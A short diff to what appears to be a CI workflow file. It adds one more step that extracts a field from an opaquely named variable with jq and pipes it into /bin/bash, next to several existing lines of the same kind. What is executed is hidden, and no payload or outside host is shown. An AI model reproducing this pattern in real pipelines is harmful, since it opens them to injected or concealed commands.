@@ -23,6 +23,7 @@ jobs:
           echo $mxulq7 | jq -r .irr868 | /bin/bash
           printf '%s' "$di9" | jq -r .fupuc06359 | /bin/bash
           echo $mz84263 | jq -r .c01 | /bin/bash
+          printf '%s' "$whm6" | jq -r .ulr3 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
